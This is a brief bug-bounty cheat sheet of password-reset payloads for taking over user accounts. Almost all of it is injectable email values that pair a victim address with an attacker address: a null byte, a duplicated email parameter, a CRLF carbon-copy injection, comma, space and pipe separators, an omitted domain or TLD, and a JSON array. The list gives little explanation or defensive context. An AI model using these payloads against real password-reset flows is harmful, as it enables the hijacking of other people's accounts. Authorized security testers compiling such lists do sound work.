# Account Takeover


### A list of common techniques to take over a user account using password reset

`victim@example.com%00`

Double Parameter

`email=victim@example.com&email=hacker@example.com`

Carbon Copy

`email=victim@example.com%0a%0dcchacker@example.com`

Seperartors

`email=victim@example.com,hacker@example.com`

`email=victim@example.com%20hacker@example.com`

`email=victim@example.com|hacker@example.com`

Omit domain

`email=victim`

Omit TLD

`email=victim.hck`

JSON

`{"email":["victim@example.com","hacker@example.com"]}`

#bugbounty #bugbountytips #awesome-bug-bounty
